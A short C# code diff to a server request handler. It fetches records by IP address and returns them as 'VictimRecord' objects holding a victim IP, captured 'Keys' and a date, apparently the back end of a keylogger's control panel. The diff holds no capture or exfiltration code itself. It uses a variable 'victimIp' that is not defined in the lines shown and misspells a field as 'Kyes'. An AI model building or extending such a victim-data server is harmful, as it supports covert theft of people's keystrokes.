@@ -36,8 +36,7 @@ namespace Server.Handlers
             if (!clientInfo.IsAuthorized)
                 return _director.GetUnauthorizedResponse().ToString();
 
-            string ip = clientInfo.RemoteEndPoint.Split(":")[0];
-            List<RecordData> records = Data.RecordsContainer.GetRecordsByIp(ip);
+            List<RecordData> records = Data.RecordsContainer.GetRecordsByIp(victimIp);
 
             List<VictimRecord> rep = records
                 .AsParallel()
@@ -45,11 +44,11 @@ namespace Server.Handlers
                 {
                     Id = r.Id,
                     VictimIp = r.Ip,
-                    Text = r.Keys,
+                    Kyes = r.Keys,
                     Date = r.Date
-                });
+                }).ToList();
 
-            return _director.GetVictimRecordsResponse(records).ToString();
+            return _director.GetVictimRecordsResponse(rep).ToString();
         }
 
         private async Task<string> LoginUser(string username, string password, ClientInfo clientInfo)
